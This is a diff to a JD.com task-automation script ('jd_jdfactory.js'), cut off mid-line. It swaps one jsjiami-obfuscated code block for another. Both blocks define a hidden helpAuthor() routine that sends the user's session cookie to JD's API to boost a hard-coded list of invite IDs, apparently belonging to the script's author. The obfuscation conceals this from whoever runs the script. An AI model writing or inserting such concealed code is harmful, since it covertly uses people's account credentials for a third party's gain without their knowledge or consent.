+++ jd_jdfactory.js
@@ -774,5 +774,5 @@ function jsonParse(str) {
   }
 }
 // prettier-ignore
-var _0xody='jsjiami.com.v6',_0x4286=[_0xody,'wrHDv8KJUSw=','csKaAsKewqc=','XVfDqDM9','SxfDsCzCqw==','IcKDEzld','VGXDhhg/','P8K2wr7Cug==','wowZbcOzwok=','SV/DlcOWEg==','w595GsOEZA==','UC/DtMK6wqY=','bgLDjwvCrw==','HsOdPycS','QTBqNsOKwonDhntX','w44xCw==','woTDm8KqZw==','Y33Cjwk8MQ==','YxTDn8K9wrM=','c8OJewsXdg==','woEWw6jDgCh2','JsOIw5PDmAB8','wp7DpMOvDXk=','d2PDtQ==','w78VbSLDtUQPQgs=','HsOhfQ==','HMOvd8Ox','w5/Dh8KTS+isveawhOWms+i3lO+/neisqeahkeads+e9gei0uemGj+ittg==','dmrDrQJX','M8OZIiU=','A8KPFil4w78=','WBvDr8OIPg==','wolNesKwwrl9','wqPCusK8w7w=','Wh/DrsOON04=','GMOBwoLDnFAj','VcKHAMK0wqM0','NUtcwq/CisKG','wpA3bsO+wpwv','wp8+w5jDoSg=','M8OXw5vChRkhwp7CvsOSw6zCjMK8','S8O8wrTDvzkQO0XCjX4=','FcKCw7RB','Q8KKQ8Kwwrk=','FMO7dMO3w7TCtW7DusOew5YD','wrMQw7vDsjzClQdPw4zDvFY0wqHChcKhLyZDCgNCwoLCmxbDtjpnQHcqwq4=','w5kuCMOUwp0=','wpIDw6vDmS1hw5nDisOxw5ZxwpjCsmNCwrfCvx7Cn8O8HTM2wqNzXsKPGBNFHMKow6U=','FhZIP8Kyw5Y=','TRTDqw==','wq9uw4M2wqHDqXLCkVZkw5ddw6c=','w7IRw59MMA==','w7waMMOUwok=','w4U7GMKQa8KcMQ==','woQZwp7CmcOY','w7suEsOBwos=','N8KbwqnDozcWSVHDjMK/GFMHJMONwqLDjinCoMOdS8OWw6TCo8K5w5rDij4awpQKwqzDgkrCqxPDusOEwrTCt8KLw5DDrCTCkW7CsW3CoMOOwqgEw4fCmMON','HcKtworChQU1Q3vDpsKyJ1AQLsOUwp3DvCDCkMOQO8OewqTClsK0w6rDlABTwrcEwqfCvEPCigDDk8OnwrzCtsKbw5HDpTTCglPCiVfCpcOL','IMO6XcOfw7rCrl7Do8OEw7NQw7HDlgN5dsK8wrXCmiXCpV/DgmUtw7rDqcKDZ8KjUUhkwrXDr2BjXMKEdmTCnsOAw4BwA8O1wr4Xw5c=','w7AqK8K/Y8OdCMO9fMKgwoXCuwvDk8KdwqvDvRMfBxfCjsOdVjXDsm7CohcgwrHCnynDpMKGw6rDg8KqwoJSUsOPCsKlwqIjwrHCmg==','VXHDjy1qY8KTJnvCi2DCrsO1w5jDqMK1CcKTwqbDicOdwr13IsOKfGMgw7Iqw6fDvMK/w6VMdcOAwpXDl8OAXipzwo0Bwp8xwpjDpQk=','w6JsIsOuWQ==','YS9gFMOB','woDCscKhw78N','OMO2BjUl','WMOMw5nDk1Y=','T8OTwpXDg38=','bkHDhcOODw==','wq3Do8KJbgc=','SyLDmCzCgcKDFcOCbsKowowSPGdDNUklCV5CZlnCvgTCu3QDw7vDkGzCmRcGwoYcJzPClTklw5rDu8KMDcKKYcKTfVA=','AcOfwrvDgmg=','dz1+DsO0','BsOdwqce','DMOEwrQ4Kw==','ViVsPg==','wptiOhIM','w7llE8OFXsOj','NsKKLTR+','jMsjiagYHmi.Mcwozm.v6kPqbt=='];(function(_0x5c7017,_0x394240,_0x668c52){var _0x5513c3=function(_0x3692e7,_0x28e5d6,_0x478877,_0x1d5123,_0x5a0efb){_0x28e5d6=_0x28e5d6>>0x8,_0x5a0efb='po';var _0x43465d='shift',_0x4d02d3='push';if(_0x28e5d6<_0x3692e7){while(--_0x3692e7){_0x1d5123=_0x5c7017[_0x43465d]();if(_0x28e5d6===_0x3692e7){_0x28e5d6=_0x1d5123;_0x478877=_0x5c7017[_0x5a0efb+'p']();}else if(_0x28e5d6&&_0x478877['replace'](/[MgYHMwzkPqbt=]/g,'')===_0x28e5d6){_0x5c7017[_0x4d02d3](_0x1d5123);}}_0x5c7017[_0x4d02d3](_0x5c7017[_0x43465d]());}return 0x79cce;};return _0x5513c3(++_0x394240,_0x668c52)>>_0x394240^_0x668c52;}(_0x4286,0xd1,0xd100));var _0x232f=function(_0x451ab9,_0x1e2374){_0x451ab9=~~'0x'['concat'](_0x451ab9);var _0xd760f=_0x4286[_0x451ab9];if(_0x232f['omeIsM']===undefined){(function(){var _0x3802b8=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x3a641d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x3802b8['atob']||(_0x3802b8['atob']=function(_0x177d48){var _0x310cae=String(_0x177d48)['replace'](/=+$/,'');for(var _0x508546=0x0,_0x321297,_0x4c6a90,_0x36b6bd=0x0,_0x512c83='';_0x4c6a90=_0x310cae['charAt'](_0x36b6bd++);~_0x4c6a90&&(_0x321297=_0x508546%0x4?_0x321297*0x40+_0x4c6a90:_0x4c6a90,_0x508546++%0x4)?_0x512c83+=String['fromCharCode'](0xff&_0x321297>>(-0x2*_0x508546&0x6)):0x0){_0x4c6a90=_0x3a641d['indexOf'](_0x4c6a90);}return _0x512c83;});}());var _0x20ee39=function(_0x25c3f6,_0x1e2374){var _0x3cb702=[],_0x335d7a=0x0,_0x9f9962,_0x44def2='',_0x281f15='';_0x25c3f6=atob(_0x25c3f6);for(var _0x169a59=0x0,_0x78d526=_0x25c3f6['length'];_0x169a59<_0x78d526;_0x169a59++){_0x281f15+='%'+('00'+_0x25c3f6['charCodeAt'](_0x169a59)['toString'](0x10))['slice'](-0x2);}_0x25c3f6=decodeURIComponent(_0x281f15);for(var _0xe0f76c=0x0;_0xe0f76c<0x100;_0xe0f76c++){_0x3cb702[_0xe0f76c]=_0xe0f76c;}for(_0xe0f76c=0x0;_0xe0f76c<0x100;_0xe0f76c++){_0x335d7a=(_0x335d7a+_0x3cb702[_0xe0f76c]+_0x1e2374['charCodeAt'](_0xe0f76c%_0x1e2374['length']))%0x100;_0x9f9962=_0x3cb702[_0xe0f76c];_0x3cb702[_0xe0f76c]=_0x3cb702[_0x335d7a];_0x3cb702[_0x335d7a]=_0x9f9962;}_0xe0f76c=0x0;_0x335d7a=0x0;for(var _0x417d94=0x0;_0x417d94<_0x25c3f6['length'];_0x417d94++){_0xe0f76c=(_0xe0f76c+0x1)%0x100;_0x335d7a=(_0x335d7a+_0x3cb702[_0xe0f76c])%0x100;_0x9f9962=_0x3cb702[_0xe0f76c];_0x3cb702[_0xe0f76c]=_0x3cb702[_0x335d7a];_0x3cb702[_0x335d7a]=_0x9f9962;_0x44def2+=String['fromCharCode'](_0x25c3f6['charCodeAt'](_0x417d94)^_0x3cb702[(_0x3cb702[_0xe0f76c]+_0x3cb702[_0x335d7a])%0x100]);}return _0x44def2;};_0x232f['oUNCom']=_0x20ee39;_0x232f['lriSDR']={};_0x232f['omeIsM']=!![];}var _0x1296e3=_0x232f['lriSDR'][_0x451ab9];if(_0x1296e3===undefined){if(_0x232f['oemOYu']===undefined){_0x232f['oemOYu']=!![];}_0xd760f=_0x232f['oUNCom'](_0xd760f,_0x1e2374);_0x232f['lriSDR'][_0x451ab9]=_0xd760f;}else{_0xd760f=_0x1296e3;}return _0xd760f;};async function helpAuthor(){var _0x4719af={'SkxKe':'W9GxiKbYIkLcHMXmYIt_mhidwkvZjcvMhX-m5_i2N9q8OtI','Gjibt':_0x232f('0','R8Hu'),'oNPqn':'RtGKzuWmEw71eIKaQtVn1-X7GtR8p7IcvhW_nUO4Jn0LobU7RA','UsFCq':_0x232f('1','R8Hu'),'oJDLk':_0x232f('2','1F#b'),'uMWlF':'W9Ggu7nAFE36FNH4coB_muZefrJOOoQ3YkddtGEQ14i71Wc','JiCWO':_0x232f('3','kGp$'),'WbvGm':_0x232f('4','aq[('),'mqXmL':function(_0x6b1f41,_0x1dbca1){return _0x6b1f41<_0x1dbca1;},'rECto':function(_0x1021b9,_0x1abbc5){return _0x1021b9(_0x1abbc5);},'EyfQP':'status','nxgGZ':function(_0x525f5b,_0x202f40){return _0x525f5b===_0x202f40;},'FvWWr':_0x232f('5','Z1OQ'),'Bmvaa':'EfMya'};let _0x4fd6e3=[_0x4719af[_0x232f('6','5fOK')],_0x4719af[_0x232f('7','jO$U')],'X92swe2tSUbvMoPWW5hqiOzqlo_K6RipsNQmYg',_0x4719af[_0x232f('8','oorN')],'RtGKzLnwQg3ye9HJFNRm0bpznSx2vJAuAMEJSOnTgv99a34ctA',_0x4719af[_0x232f('9','v0g^')],_0x4719af[_0x232f('a','8ZMS')],_0x4719af[_0x232f('b','kt0n')],_0x4719af[_0x232f('c','lT#w')],_0x232f('d','u6EL'),_0x4719af['WbvGm']];for(let _0x1350cc=0x0;_0x4719af[_0x232f('e','(YHQ')](_0x1350cc,_0x4fd6e3['length']);++_0x1350cc){let _0x55f6a7=await _0x4719af['rECto'](getInfo,_0x4fd6e3[_0x1350cc]);if(_0x55f6a7[_0x4719af[_0x232f('f','5fOK')]]&&_0x55f6a7[_0x4719af['EyfQP']]==='3'||_0x55f6a7[_0x232f('10','l2SK')]&&_0x4719af[_0x232f('11','l2SK')](_0x55f6a7[_0x232f('12','5fOK')]['bizCode'],-0xb)){if(_0x4719af[_0x232f('13','4C#H')]!==_0x4719af['Bmvaa']){break;}else{$[_0x232f('14','Z1OQ')](e,resp);}}}}function getInfo(_0x32c84e){var _0x286ac9={'KxlMp':function(_0x574b0d,_0x33e395){return _0x574b0d!==_0x33e395;},'jdzXc':_0x232f('15','7hzz'),'VcdcQ':function(_0x122dc9,_0x297c80){return _0x122dc9===_0x297c80;},'dhvQT':_0x232f('16','lT#w'),'cVTsa':'mYJot','EylsX':function(_0x3e9ddd,_0x347265){return _0x3e9ddd(_0x347265);},'pAdHg':function(_0x5534e7,_0x443a5b,_0x12e68a){return _0x5534e7(_0x443a5b,_0x12e68a);},'OFpgc':'city_getHomeData'};let _0x3076c3={'lbsCity':'12','realLbsCity':'904','inviteId':_0x32c84e,'headImg':'','userName':''};return new Promise(_0x3b2877=>{var _0x558e82={'qsoHf':function(_0x113703,_0x1663ed){return _0x286ac9[_0x232f('17','swRt')](_0x113703,_0x1663ed);},'CZYtp':_0x286ac9[_0x232f('18','N4U$')],'wTPlT':_0x232f('19','u6EL'),'XxzNA':function(_0xc6eb7b,_0x154a04){return _0x286ac9[_0x232f('1a','7hzz')](_0xc6eb7b,_0x154a04);},'wRizB':_0x286ac9['dhvQT'],'GnOOQ':_0x286ac9[_0x232f('1b','N4U$')],'qoedG':function(_0x5154d4,_0x4b02d3){return _0x286ac9['EylsX'](_0x5154d4,_0x4b02d3);},'lMCTl':function(_0x5c5c43,_0x2fdb38){return _0x5c5c43(_0x2fdb38);}};$[_0x232f('1c','R8Hu')](_0x286ac9[_0x232f('1d',']EL5')](taskPostUrl2,_0x286ac9['OFpgc'],_0x3076c3),async(_0x39efbf,_0x1fd7dd,_0x26a873)=>{var _0x2c6efa={'FJjtU':function(_0x1ec29d,_0x22b940){return _0x1ec29d(_0x22b940);}};try{if(_0x558e82[_0x232f('1e','ac(q')](_0x232f('1f','Z1OQ'),_0x558e82[_0x232f('20','&epC')])){if(_0x39efbf){if(_0x558e82[_0x232f('21','u6EL')]!==_0x232f('22','oorN')){console['log'](''+JSON[_0x232f('23','5fOK')](_0x39efbf));console[_0x232f('24','kGp$')]($['name']+'\x20API请求失败，请检查网路重试');}else{_0x2c6efa['FJjtU'](_0x3b2877,_0x26a873[_0x232f('25','gMpi')][_0x232f('26','FQKk')]['toasts'][0x0]);}}else{if(_0x26a873){_0x26a873=JSON[_0x232f('27','&epC')](_0x26a873);if(_0x26a873['data'][_0x232f('28','VxHi')]['toasts']&&_0x26a873['data'][_0x232f('29','xQMf')][_0x232f('2a',')LE1')]['length']){if(_0x558e82[_0x232f('2b','N%SZ')](_0x558e82['wRizB'],_0x558e82['GnOOQ'])){console[_0x232f('2c','kt0n')](''+JSON[_0x232f('2d','6$dh')](_0x39efbf));console[_0x232f('2e','1F#b')]($[_0x232f('2f','1F#b')]+_0x232f('30','l)sl'));}else{_0x558e82[_0x232f('31','aq[(')](_0x3b2877,_0x26a873[_0x232f('32','oorN')]['result'][_0x232f('33','7hzz')][0x0]);}}}}}else{if(_0x26a873){_0x26a873=JSON[_0x232f('34','P89e')](_0x26a873);if(_0x26a873['data'][_0x232f('35','jGme')]['toasts']&&_0x26a873[_0x232f('36','jO$U')][_0x232f('37','P89e')][_0x232f('38','(YHQ')][_0x232f('39','swRt')]){_0x3b2877(_0x26a873['data'][_0x232f('3a','fDv[')]['toasts'][0x0]);}}}}catch(_0x2e9176){$[_0x232f('3b',']EL5')](_0x2e9176,_0x1fd7dd);}finally{_0x558e82[_0x232f('3c','xQMf')](_0x3b2877,_0x26a873);}});});}function taskPostUrl2(_0x9fb381,_0x4d8427){var _0x2850c8={'LvDFU':function(_0x5f75f7,_0x3362e5){return _0x5f75f7(_0x3362e5);},'qfvVr':_0x232f('3d',')LE1'),'VNIYq':_0x232f('3e','8ZMS'),'mCaCB':function(_0x590d20,_0x2f878d){return _0x590d20(_0x2f878d);},'szqYe':'./USER_AGENTS','rUUxP':_0x232f('3f','N5rL'),'WnjYn':_0x232f('40','swRt'),'tNSLg':'gzip,\x20deflate,\x20br'};return{'url':'https://api.m.jd.com/client.action','body':_0x232f('41','1F#b')+_0x9fb381+'&body='+_0x2850c8['LvDFU'](escape,JSON['stringify'](_0x4d8427))+_0x232f('42','92[W'),'headers':{'Cookie':cookie,'Host':_0x2850c8['qfvVr'],'Connection':_0x2850c8[_0x232f('43','xbC2')],'Content-Type':_0x232f('44','xQMf'),'User-Agent':$[_0x232f('45','e3AW')]()?process['env']['JD_USER_AGENT']?process[_0x232f('46','P89e')][_0x232f('47','Al5c')]:_0x2850c8[_0x232f('48','Ps@P')](require,_0x2850c8[_0x232f('49','xbC2')])['USER_AGENT']:$['getdata'](_0x2850c8['rUUxP'])?$[_0x232f('4a','kGp$')](_0x2850c8[_0x232f('4b','Wo$m')]):'jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2\x20CFNetwork/1206\x20Darwin/20.1.0','Accept-Language':_0x2850c8['WnjYn'],'Accept-Encoding':_0x2850c8[_0x232f('4c','xbC2')]}};};_0xody='jsjiami.com.v6';
+var _0xodC='jsjiami.com.v6',_0x500d=[_0xodC,'QyvCmyoJwpg=','csOPw5sNG2DCr21Ew5slbw==','Bmtgwp7Du8KLbsKqL8Ku','wotFTzE=','KMKxwrVewpPDnQR5wq7Ds1rCksKVJWnCoH9bw4gNesOuw5nCn8OzYcOKJ8Omw57CpMOkwqd/w6QkC8KOHMKcw5I7wqDCrMK0ZMO2w6Vxbj/Cm8OLMUTCi8Oew73DncORDMOybsK8FcKpE8Kxwp7DoBvDv1I5ZcKXw7s=','GWAVwrFS','HMOtwoE+w5Q=','EcOXwp0ww58=','w7UrfsOMw6PDnQ5UK8KGfyXChlPDh3g=','VD4x','w7VzcHjCpA==','HMOEwoc1w5t7C8O3VsKdITpBBA8rDGpzw6REHlEAC8KrXwYbLhHDmnE=','WhzCnz41','w7/CpislWw==','wpXDqGTDlMOa','w5bDocOqfsKU','fsO6w4JXJg==','w7fDu8KEwo0s','wpsuN8Oy','MB/ChkUK','w4kOwqPDuBdED8KTwqo=','FxnCmA==','H2N4wpI=','PmFgKOivouawjuWlm+i3vu+8l+itmeagjeaeque+gOi1iemFmeispw==','wqrCmnrDgMOxVA==','wq/DvX4VNg==','PMO4P8OyQQ==','csOmw4REEA==','HW1y','OQNOTg==','U8Olw7wS6K+m5rCh5aeK6Laa772b6K2e5qOo5p6F57686LS36Yep6KyL','w5jDgcOQUw==','KiPChMKjwqN7','bMKcaifCliM=','e8KEwr04','D8ORwoQsw55s','Z8OQw5NQAj0=','IxnCq0A6','LMKSwrNZwpA=','wpAaEMOp','F2dZwqFIQQ==','OcKHwqY9woDCiQ==','RDDCiDATwowbw64V','HiXCjnQ6ZlTDg1/CoBhKFHhVUcKXwqAIGU9Ww4wVw4I3w41vw6/Crl0=','ah/Co8ORwrI=','S8Kmwq44wqA=','VCLCmTMl','CMKRwot7wrDCoz92wofDm3HCucO6','asOzwrE=','bMO6woF9wqbCtDJowoHDmXrCo8O9','KMOnwrILw61ZLcOGccKm','w6zCosOraSTDsMKS','dsKLwq5RKMKvwpQ=','KDrCl04p','Z0RiOWI=','HsOENMOCdw==','dMOFw5tTWm7CoWwMw5QrdsOwaMKVSMOo','D2dfwpdOQA==','EsOUw5w3eADCmsOLPsOGRk/ClcO1U8KpwpTCsQDCgMK3VMO2HcOZPn47GsKEWsOFwr8=','RRnCrMOJ','wrUGfsOsw4PCocK8EcKCwoHDoHjCgS3DgcO3wqU=','w5wPwr/Dsg1KCcKbwpovwqs=','wqzChQ8FYwI=','Mkxwwr5t','EHxKwrtSVXkeQw==','w4LDnsKAWMK7','w5LDrsKuwosGOA==','woRWSA==','J0pawrvChcKvUMKcGMKMw6TDlQw=','BsKGShwcFyPDv2Rpw5kXw50=','w7XDmMKIwqUK','P8OBwo9mDMKJwqrDgVsmw5PDhlk=','w4MRT8Onw6PDuyxlLcK9','w5vDhcOQVsKFw4Ug','JcKwwqBKwoLCkgw=','O8OmwoIzw74=','wrXDkMKXXiE=','woFuADAP','w4TDocOmXsKsw7YUwokBbsOkwppzFcOvMCbCmhDChMORwpwbw6jCm8OVIQrCiQsCwrZ/UMOgNsOTwpxkwp1fwr8=','wrQxYMOxwoc=','YsKawrtBPMKo','HCLCusKMwpw=','bS3CiUwu','XcOpwoDDtcOWWBXDkcODRMOLakpmwrnDgzfDkcKJwojDlELDu8OnJGBiw7MJw4rCtxrCpcK0IcOvwpQ6esKlHWvDjMKheMK1woHDiMOrbA==','EMKhwpNlwpnCqV9HwpTDjWvCjsOLUhDDhhQwwqVVfsK6wqfCkcKvRcOGMsOcwqrDjsKXwqwyw69DbMKPdMOzwr4Iw63DmsObLsK2wpkUWg==','w7HDg8KfVMKk','fsKRwpwtwrU=','HTvCiEsA','w6VCYsKmw4g=','wqnDpFAvHA==','KMKjYSg=','HW93wp3Csw==','wrnDtkHCmMKRdA==','wrLDnkPDlA==','MMKwwqdbwo/Ckg==','jsfjbiuamMi.comO.v6DFLHWgXdrnVOH=='];(function(_0x2bc68e,_0x554cb3,_0x46fc5d){var _0x1ef243=function(_0x1ce99b,_0x410530,_0x226f1a,_0x199949,_0x1ab08e){_0x410530=_0x410530>>0x8,_0x1ab08e='po';var _0x2a4da8='shift',_0x22939b='push';if(_0x410530<_0x1ce99b){while(--_0x1ce99b){_0x199949=_0x2bc68e[_0x2a4da8]();if(_0x410530===_0x1ce99b){_0x410530=_0x199949;_0x226f1a=_0x2bc68e[_0x1ab08e+'p']();}else if(_0x410530&&_0x226f1a['replace'](/[fbuMODFLHWgXdrnVOH=]/g,'')===_0x410530){_0x2bc68e[_0x22939b](_0x199949);}}_0x2bc68e[_0x22939b](_0x2bc68e[_0x2a4da8]());}return 0x79e26;};return _0x1ef243(++_0x554cb3,_0x46fc5d)>>_0x554cb3^_0x46fc5d;}(_0x500d,0xad,0xad00));var _0x58e0=function(_0x31fe86,_0x124f1a){_0x31fe86=~~'0x'['concat'](_0x31fe86);var _0x3eb61e=_0x500d[_0x31fe86];if(_0x58e0['cTapzf']===undefined){(function(){var _0x4cd4ec=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x35cb03='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x4cd4ec['atob']||(_0x4cd4ec['atob']=function(_0x4ec6fb){var _0x5c6a43=String(_0x4ec6fb)['replace'](/=+$/,'');for(var _0x39b296=0x0,_0x3afd04,_0x167def,_0x4bfe9f=0x0,_0x235050='';_0x167def=_0x5c6a43['charAt'](_0x4bfe9f++);~_0x167def&&(_0x3afd04=_0x39b296%0x4?_0x3afd04*0x40+_0x167def:_0x167def,_0x39b296++%0x4)?_0x235050+=String['fromCharCode'](0xff&_0x3afd04>>(-0x2*_0x39b296&0x6)):0x0){_0x167def=_0x35cb03['indexOf'](_0x167def);}return _0x235050;});}());var _0x1b03da=function(_0x436888,_0x124f1a){var _0x2342e6=[],_0x21c185=0x0,_0x302456,_0x231e9f='',_0x247667='';_0x436888=atob(_0x436888);for(var _0x57c0e5=0x0,_0x3dd57f=_0x436888['length'];_0x57c0e5<_0x3dd57f;_0x57c0e5++){_0x247667+='%'+('00'+_0x436888['charCodeAt'](_0x57c0e5)['toString'](0x10))['slice'](-0x2);}_0x436888=decodeURIComponent(_0x247667);for(var _0x2fa999=0x0;_0x2fa999<0x100;_0x2fa999++){_0x2342e6[_0x2fa999]=_0x2fa999;}for(_0x2fa999=0x0;_0x2fa999<0x100;_0x2fa999++){_0x21c185=(_0x21c185+_0x2342e6[_0x2fa999]+_0x124f1a['charCodeAt'](_0x2fa999%_0x124f1a['length']))%0x100;_0x302456=_0x2342e6[_0x2fa999];_0x2342e6[_0x2fa999]=_0x2342e6[_0x21c185];_0x2342e6[_0x21c185]=_0x302456;}_0x2fa999=0x0;_0x21c185=0x0;for(var _0x55969b=0x0;_0x55969b<_0x436888['length'];_0x55969b++){_0x2fa999=(_0x2fa999+0x1)%0x100;_0x21c185=(_0x21c185+_0x2342e6[_0x2fa999])%0x100;_0x302456=_0x2342e6[_0x2fa999];_0x2342e6[_0x2fa999]=_0x2342e6[_0x21c185];_0x2342e6[_0x21c185]=_0x302456;_0x231e9f+=String['fromCharCode'](_0x436888['charCodeAt'](_0x55969b)^_0x2342e6[(_0x2342e6[_0x2fa999]+_0x2342e6[_0x21c185])%0x100]);}return _0x231e9f;};_0x58e0['ZkHeYY']=_0x1b03da;_0x58e0['iKWbTb']={};_0x58e0['cTapzf']=!![];}var _0xed9d60=_0x58e0['iKWbTb'][_0x31fe86];if(_0xed9d60===undefined){if(_0x58e0['zWUsUf']===undefined){_0x58e0['zWUsUf']=!![];}_0x3eb61e=_0x58e0['ZkHeYY'](_0x3eb61e,_0x124f1a);_0x58e0['iKWbTb'][_0x31fe86]=_0x3eb61e;}else{_0x3eb61e=_0xed9d60;}return _0x3eb61e;};async function helpAuthor(){var _0x4f2e9e={'DdMZS':'RtGKzrqsSQOgfNGcRtI1h172t6LAxsMstyh5Ja6FZwQmVDdq-w','UkkQq':'RtGKzOn1R1imd4aZRdU2hBIBgJ03z2Yq-l50VjzK7d6LW8ENFw','uyNOq':'HYbiyeWlRQmkfYP1V5h_msHdhHllBQpLhhZV4Prz1-z-TA','BBnMi':_0x58e0('0','otPF'),'TTdpF':function(_0x5443bb,_0x21f07d){return _0x5443bb<_0x21f07d;},'atUtL':function(_0x14d196,_0x151722){return _0x14d196===_0x151722;},'GGzGX':_0x58e0('1','Ti^x'),'ibEYz':function(_0x4a4a29,_0x5799ba){return _0x4a4a29(_0x5799ba);},'yLmac':_0x58e0('2','8n9o'),'CKbXM':function(_0xf6708b,_0x1d5f2a){return _0xf6708b===_0x1d5f2a;}};let _0x247159=[_0x4f2e9e[_0x58e0('3','VJmD')],_0x4f2e9e[_0x58e0('4','#jnJ')],_0x58e0('5','Zyfd'),_0x58e0('6','6jyC'),_0x4f2e9e['uyNOq'],_0x4f2e9e['BBnMi']];for(let _0x25e6c8=0x0;_0x4f2e9e[_0x58e0('7','NN8c')](_0x25e6c8,_0x247159['length']);++_0x25e6c8){if(_0x4f2e9e[_0x58e0('8','a1iB')](_0x58e0('9','LoVv'),_0x4f2e9e['GGzGX'])){let _0x4abbc0=await _0x4f2e9e[_0x58e0('a','@OJJ')](getInfo,_0x247159[_0x25e6c8]);if(_0x4abbc0[_0x4f2e9e['yLmac']]&&_0x4f2e9e['atUtL'](_0x4abbc0[_0x4f2e9e['yLmac']],'3')||_0x4abbc0['data']&&_0x4f2e9e[_0x58e0('b','mI%x')](_0x4abbc0[_0x58e0('c','zVz9')]['bizCode'],-0xb)){break;}}else{data=JSON[_0x58e0('d','sY*x')](data);if(data['data'][_0x58e0('e','4SC&')]['toasts']&&data[_0x58e0('c','zVz9')]['result']['toasts']['length']){resolve(data[_0x58e0('f','oate')][_0x58e0('10','6jyC')][_0x58e0('11','4BZ@')][0x0]);}}}}function getInfo(_0x38fd4a){var _0x34175d={'sOEmb':_0x58e0('12','#s@f'),'DKDbk':_0x58e0('13','sY*x'),'mXegH':_0x58e0('14','E[6^'),'uAKDA':_0x58e0('15','6jyC'),'CWSag':_0x58e0('16','(d!W'),'jANLp':'YnbPd','fgINH':_0x58e0('17','FAg*'),'mEptP':function(_0xd79e7b,_0x384082){return _0xd79e7b===_0x384082;},'Nofhk':_0x58e0('18','FAg*'),'LfdiN':function(_0x526283,_0x4ecfe7){return _0x526283(_0x4ecfe7);},'GvXvi':function(_0x418906,_0x2f671f,_0x264065){return _0x418906(_0x2f671f,_0x264065);},'jXANA':_0x58e0('19','Inq]'),'EoNdA':_0x58e0('1a','sY*x')};let _0x371cf0={'lbsCity':'12','realLbsCity':_0x34175d['EoNdA'],'inviteId':_0x38fd4a,'headImg':'','userName':''};return new Promise(_0x19394f=>{var _0x5a9261={'eBZYQ':_0x34175d[_0x58e0('1b','RtSz')],'TCgaY':_0x34175d['DKDbk'],'cfcjX':_0x58e0('1c','FAg*'),'SLhhA':_0x34175d[_0x58e0('1d','4BZ@')],'ydRXw':_0x34175d[_0x58e0('1e','IXBL')],'PyyJG':_0x34175d[_0x58e0('1f','oate')],'Kiycb':_0x34175d[_0x58e0('20','otPF')],'ERLbg':function(_0x578505,_0x3fcebc){return _0x578505(_0x3fcebc);},'UHwTv':function(_0x2c3957,_0x385310){return _0x2c3957!==_0x385310;},'rErzq':_0x34175d['fgINH'],'XoTfR':function(_0x48a16b,_0x322e73){return _0x34175d[_0x58e0('21','#s@f')](_0x48a16b,_0x322e73);},'nGgws':_0x34175d['Nofhk'],'tanTm':function(_0x4f770d,_0x1bad4a){return _0x34175d[_0x58e0('22','ckSC')](_0x4f770d,_0x1bad4a);},'IyrGt':function(_0x4036b0,_0x5b0ae9){return _0x34175d['LfdiN'](_0x4036b0,_0x5b0ae9);}};$[_0x58e0('23','Kho6')](_0x34175d['GvXvi'](taskPostUrl2,_0x34175d['jXANA'],_0x371cf0),async(_0x349844,_0xb27c08,_0xd699fe)=>{try{if(_0x349844){if('iFoXo'!==_0x5a9261[_0x58e0('24','LoVv')]){console['log'](''+JSON[_0x58e0('25','1Dd#')](_0x349844));console[_0x58e0('26','LoVv')]($[_0x58e0('27','$5nC')]+_0x58e0('28','npX!'));}else{$[_0x58e0('29','*MIx')](e,_0xb27c08);}}else{if(_0x5a9261[_0x58e0('2a','mI%x')](safeGet,_0xd699fe)){if(_0x5a9261['UHwTv'](_0x5a9261[_0x58e0('2b','VE2@')],_0x58e0('2c','#s@f'))){console[_0x58e0('2d','$5nC')](''+JSON['stringify'](_0x349844));console['log']($[_0x58e0('2e','@9&$')]+_0x58e0('2f','6fF['));}else{_0xd699fe=JSON['parse'](_0xd699fe);if(_0xd699fe[_0x58e0('30','otPF')][_0x58e0('31','VJmD')][_0x58e0('32','vn!z')]&&_0xd699fe[_0x58e0('33','a1iB')][_0x58e0('34','FAg*')][_0x58e0('35','#s@f')]['length']){if(_0x5a9261[_0x58e0('36','LoVv')]('lcjim',_0x5a9261[_0x58e0('37','6jyC')])){_0x5a9261['tanTm'](_0x19394f,_0xd699fe[_0x58e0('38','Z2DN')]['result'][_0x58e0('39','(d!W')][0x0]);}else{return{'url':''+JD_API_HOST,'body':'functionId='+functionId+_0x58e0('3a','a1iB')+escape(JSON[_0x58e0('3b','4BZ@')](_0x371cf0))+_0x58e0('3c','#jnJ'),'headers':{'Cookie':cookie,'Host':_0x5a9261[_0x58e0('3d','IVN]')],'Connection':_0x5a9261[_0x58e0('3e','a1iB')],'Content-Type':_0x5a9261[_0x58e0('3f','4BZ@')],'User-Agent':$['isNode']()?process['env'][_0x58e0('40','6jyC')]?process[_0x58e0('41','Zyfd')]['JD_USER_AGENT']:require(_0x58e0('42','6jyC'))[_0x58e0('43','FAg*')]:$[_0x58e0('44','3@An')](_0x5a9261['SLhhA'])?$[_0x58e0('45','8n9o')](_0x5a9261[_0x58e0('46','LoVv')]):_0x5a9261[_0x58e0('47','npX!')],'Accept-Language':_0x5a9261[_0x58e0('48','VE2@')],'Accept-Encoding':_0x58e0('49','#s@f')}};}}}}}}catch(_0x1f5dde){$[_0x58e0('4a','(d!W')](_0x1f5dde,_0xb27c08);}finally{_0x5a9261['IyrGt'](_0x19394f,_0xd699fe);}});});}function taskPostUrl2(_0x5729b2,_0x339ce3){var _0x17c64c={'QDHlQ':function(_0x27cd0b,_0x99abb2){return _0x27cd0b(_0x99abb2);},'NUlGc':'keep-alive','PpzWJ':_0x58e0('4b','6fF['),'NEhAh':function(_0xd1b6f0,_0xa50bb5){return 